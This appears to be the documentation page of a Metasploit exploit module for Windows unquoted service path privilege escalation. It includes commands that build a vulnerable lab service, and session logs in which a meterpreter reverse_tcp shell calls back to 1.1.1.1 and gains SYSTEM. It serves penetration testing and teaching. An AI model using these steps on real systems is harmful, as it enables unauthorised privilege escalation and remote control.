{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/unquoted_service_path","result":{"data":{"moduleMetadataJson":{"id":"5be6a9d1-4452-5b07-9ec9-3878201c2b88","name":"Windows Unquoted Service Path Privilege Escalation","fullname":"exploit/windows/local/unquoted_service_path","description":"This module exploits a logic flaw due to how the lpApplicationName parameter\n        is handled.  When the lpApplicationName contains a space, the file name is\n        ambiguous.  Take this file path as example: C:\\program files\\hello.exe;\n        The Windows API will try to interpret this as two possible paths:\n        C:\\program.exe, and C:\\program files\\hello.exe, and then execute all of them.\n        To some software developers, this is an unexpected behavior, which becomes a\n        security problem if an attacker is able to place a malicious executable in one\n        of these unexpected paths, sometimes escalate privileges if run as SYSTEM.\n        Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the\n        same problem.\n\n        The offensive technique is also described in Writing Secure Code (2nd Edition),\n        Chapter 23, in the section \"Calling Processes Security\" on page 676.\n\n        This technique was previously called Trusted Service Path, but is more commonly\n        known as Unquoted Service Path.\n\n        The service exploited won't start until the payload written to disk is removed.\n        Manual cleanup is required.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/unquoted_service_path","documentationSlug":"/modules/documentation/exploit/windows/local/unquoted_service_path","referencesSlug":"/modules/references/exploit/windows/local/unquoted_service_path"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Commonly known as Trusted Service Path, or Unquoted Service path, this exploits a behavior of windows service.\nWhen a service calls an executable, a full path is given.  If the full path contains a space,\nWindows will attempt to execute a file up to the space, with <code class=\"language-text\">.exe</code> appended.\nIf the executable isn't found, it keeps going until the full path or the next space (and repeat).</p>\n<p>@sumitvgithub had an excellent write-up on this\n<a href=\"https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a></p>\n<p>As is documented in that write-up, if the executable is C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe</p>\n<p>Windows will attempt to run the following, in order.</p>\n<ol>\n<li>C:\\Program.exe</li>\n<li>C:\\Program Files\\A.exe</li>\n<li>C:\\Program Files\\A Subfolder\\B.exe</li>\n<li>C:\\Program Files\\A Subfolder\\B Subfolder\\C.exe</li>\n<li>C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe</li>\n</ol>\n<p>To exploit this, we simply need to go in reverse order to see if we're able to write a payload to those locations.\nIn Win7+ the deeper folders are more likely to succeed based on default Windows permissions for users.</p>\n<p>Then, a service restart is required.  Often a user won't be able to do this,\nso the payload is left on disk as a reboot or service restart will trigger the payload to launch.</p>\n<p>The service will fail to start as long as the payload remains on disk.  Manual cleanup of the payload\nis required.</p>\n<h3 id=\"creating-a-vulnerable-service\" style=\"position:relative;\"><a href=\"#creating-a-vulnerable-service\" aria-label=\"creating a vulnerable service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating a Vulnerable Service</h3>\n<p>This is sourced from @sumitvgithub's write-up\n<a href=\"https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a></p>\n<p>With an administrator command prompt, execute the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sc create &quot;Some Vulnerable Service&quot; binpath= &quot;C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe&quot; Displayname= &quot;Vuln Service DP&quot; start= auto\nmkdir &quot;C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder&quot;\nicacls &quot;C:\\Program Files\\A Subfolder&quot; /grant &quot;BUILTIN\\Users&quot;:W</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>This creates a vulnerable service, with <code class=\"language-text\">A Subfolder</code> being vulnerable to user writes.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get a user shell</li>\n<li>Do: <code class=\"language-text\">use exploits/windows/local/unquoted_service_path</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should either get a shell, or need to start a <code class=\"language-text\">multi/handler</code> and have the target restarted.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"quick\" style=\"position:relative;\"><a href=\"#quick\" aria-label=\"quick permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>QUICK</h3>\n<p>If only the first service should attempt to be exploited, or all of them (sequentially).  Default is <code class=\"language-text\">true</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-16299-with-service-listed-above\" style=\"position:relative;\"><a href=\"#windows-10-16299-with-service-listed-above\" aria-label=\"windows 10 16299 with service listed above permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 (16299) with Service Listed Above</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Using exploit/windows/local/unquoted_service_path\nresource (unquoted.rb)&gt; setg verbose true\nverbose =&gt; true\nresource (unquoted.rb)&gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nresource (unquoted.rb)&gt; setg lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (unquoted.rb)&gt; setg lport 4444\nlport =&gt; 4444\nresource (unquoted.rb)&gt; set session 1\nsession =&gt; 1\nmsf5 exploit(windows/local/unquoted_service_path) &gt; \n[*] Sending stage (180291 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:8888 -&gt; 2.2.2.2:49696) at 2020-04-10 14:41:32 -0400\n\nmsf5 exploit(windows/local/unquoted_service_path) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : MSEDGEWIN10\nOS              : Windows 10 (10.0 Build 16299).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; getuid\nServer username: MSEDGEWIN10\\IEUser\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(windows/local/unquoted_service_path) &gt; run\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Finding a vulnerable service...\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique\n[+] Found vulnerable service: Some Vulnerable Service - C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe (LocalSystem)\n[*] Attempting exploitation of Some Vulnerable Service\n[*] Enumerating vulnerable paths\n[*] Checking writability to: C:\\Program Files\\A Subfolder\\B Subfolder\n[-] Path not writable\n[*] Checking writability to: C:\\Program Files\\A Subfolder\n[+] Path is writable\n[*] Placing C:\\Program Files\\A Subfolder\\B.exe for Some Vulnerable Service\n[*] Attempting to write 15872 bytes to C:\\Program Files\\A Subfolder\\B.exe...\n[+] Manual cleanup of C:\\Program Files\\A Subfolder\\B.exe is required due to a potential reboot for exploitation.\n[+] Successfully wrote payload\n[*] Launching service Some Vulnerable Service...\n[*] Manual cleanup of the payload file is required. Some Vulnerable Service will fail to start as long as the payload remains on disk.\n[-] [Some Vulnerable Service] Unhandled error: Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.\n[-] Unable to restart service.  System reboot or an admin restarting the service is required.  Payload left on disk!!!\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Manually start a handler, and restart the service (via GUI) to launch the exploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/local/unquoted_service_path) &gt; handler -p windows/meterpreter/reverse_tcp -H 1.1.1.1 -P 4444\n[*] Payload handler running as background job 1.\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \nmsf5 exploit(windows/local/unquoted_service_path) &gt; [*] Sending stage (180291 bytes) to 2.2.2.2\n[*] Meterpreter session 2 opened (1.1.1.1:4444 -&gt; 2.2.2.2:49708) at 2020-04-10 14:43:26 -0400\n\nmsf5 exploit(windows/local/unquoted_service_path) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; sysinfo\nComputer        : MSEDGEWIN10\nOS              : Windows 10 (10.0 Build 16299).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The most important part!!!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; rm &quot;C:\\\\Program Files\\\\A Subfolder\\\\B.exe&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}}},"pageContext":{"id":"5be6a9d1-4452-5b07-9ec9-3878201c2b88"}}}